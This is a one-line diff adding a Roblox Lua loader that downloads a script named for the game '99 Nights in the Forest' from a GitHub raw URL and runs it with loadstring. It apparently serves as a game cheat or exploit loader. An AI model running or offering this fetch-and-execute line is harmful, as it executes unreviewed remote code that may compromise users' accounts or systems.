@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/xielbers/scripts/refs/heads/main/99-nights-in-the-forest.lua"))()
